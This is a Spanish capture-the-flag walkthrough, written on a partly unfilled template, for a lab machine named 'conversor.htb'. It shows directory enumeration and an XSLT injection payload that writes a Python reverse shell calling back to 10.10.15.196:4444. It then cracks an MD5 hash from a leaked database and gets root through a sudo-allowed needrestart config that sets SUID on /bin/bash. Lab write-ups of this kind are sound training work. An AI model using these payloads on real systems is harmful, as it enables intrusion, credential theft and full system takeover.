# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Discovery
* Directory
```bash
feroxbuster -u http://conversor.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,pdf,html,txt,js,txt,log --dont-filter --status-codes 200,204,301,302,307,403,401 --threads 50
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://conversor.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 403, 401]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, pdf, html, txt, js, txt, log]
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        5l       22w      199c http://conversor.htb/ => http://conversor.htb/login
302      GET        5l       22w      199c http://conversor.htb/logout => http://conversor.htb/login
200      GET       22l       50w      722c http://conversor.htb/login
200      GET      290l      652w     5938c http://conversor.htb/static/style.css
200      GET       21l       50w      726c http://conversor.htb/register
301      GET        9l       28w      319c http://conversor.htb/javascript => http://conversor.htb/javascript/
200      GET       81l      214w     2842c http://conversor.htb/about
200      GET      362l     2080w   178136c http://conversor.htb/static/images/fismathack.png
200      GET     6309l    35740w  3066135c http://conversor.htb/static/images/arturo.png
200      GET     8304l    46775w  4058063c http://conversor.htb/static/images/david.png
200      GET        0l        0w  4085760c http://conversor.htb/static/source_code.tar.gz
301      GET        9l       28w      326c http://conversor.htb/javascript/jquery => http://conversor.htb/javascript/jquery/
200      GET    10879l    44396w   288550c http://conversor.htb/javascript/jquery/jquery
200      GET    10879l    44396w   288550c http://conversor.htb/javascript/jquery/jquery.js
403      GET        9l       28w      278c http://conversor.htb/server-status
[####################] - 22m   638200/638200  0s      found:15      errors:2190   
[####################] - 21m   212672/212672  169/s   http://conversor.htb/ 
[####################] - 21m   212672/212672  170/s   http://conversor.htb/javascript/ 
[####################] - 21m   212672/212672  171/s   http://conversor.htb/javascript/jquery/
```

```bash
tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

#### Paso 2: Acceso inicial

```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common" 
 extension-element-prefixes="exploit"
 version="1.0">
 <xsl:template match="/">
 <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.196",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>
```
* Penelope

```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db "SELECT password FROM users WHERE username = 'fismathack';"
5b5c3ac3a1c897c94caad48e6c71fdec
# pasamos por crackstation
5b5c3ac3a1c897c94caad48e6c71fdec	md5	Keepmesafeandwarm
www-data@conversor:/home$ su fismathack
Password: 
fismathack@conversor:/home$ 
```

#### Paso 3: Escalada de privilegios

* fismathack

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

[POC](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)

* root

```bash
fismathack@conversor:~$ needrestart --version | grep -q "3.7" && echo "Definitely vulnerable" || echo "Version is potentially not vulnerable, this simply checks for 3.7"
Definitely vulnerable
```

```bash
fismathack@conversor:/tmp$ nano pwn.conf

# En nano

$nrconf{restart} = 'l';

system('chmod u+s /bin/bash');
```

* Obtenemos el flag
```bash

fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /tmp/pwn.conf
Scanning processes...                                                                                                                                                                                                                       
Scanning candidates...                                                                                                                                                                                                                      
Scanning linux images...                                                                                                                                                                                                                    

Running kernel seems to be up-to-date.

Services to be restarted:
 systemctl restart cron.service

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.

fismathack@conversor:/tmp$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd root && cat root.txt
bash: cd: root: No such file or directory
bash-5.1# cd /root && cat root.txt
a50238f013247599b09514d6b2a65255
bash-5.1# 
```
